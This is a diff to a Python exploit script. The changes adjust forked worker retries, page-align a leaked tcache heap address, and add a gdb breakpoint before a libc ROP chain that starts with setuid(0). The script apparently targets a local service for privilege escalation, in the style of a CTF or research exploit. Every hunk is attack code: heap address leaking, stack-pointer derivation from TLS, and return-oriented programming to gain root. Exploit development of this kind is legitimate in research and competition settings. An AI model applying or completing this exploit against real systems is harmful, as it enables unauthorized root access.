@@ -172,7 +172,7 @@ def make_workers(num: int, fn, *args):
     for i in range(num):
         pid = os.fork()
         if not pid:
-            for _ in range(TRIES):
+            for _ in range(2000):
                 fn(*args)
             sys.exit(0)
         pids.append(pid)
@@ -231,8 +231,8 @@ def get_tcache_leak(thd1, thd2):
         tcache_addr = tcache_leak(thd1, thd2)
         if tcache_addr:
             print("\ntcache leak:", hex(tcache_addr))
-            thd1.tcache_leak = tcache_addr
-            return tcache_addr
+            thd1.tcache_leak = tcache_addr & ~0xFFF
+            return thd1.tcache_leak
 
         if not i % 500:
             print("... ", end='')
@@ -378,6 +378,9 @@ def exploit():
     print("thd1 tls: ", hex(thd1.tls))
     thd1.rsp = thd1.tls + TLS_RSP_OFF
     print("RSP value:", hex(thd1.rsp))
+
+    attach_gdb(pause=True)
+    return
 
     rop = p.ROP(libc, badchars=string.whitespace.encode())
     rop.setuid(0)
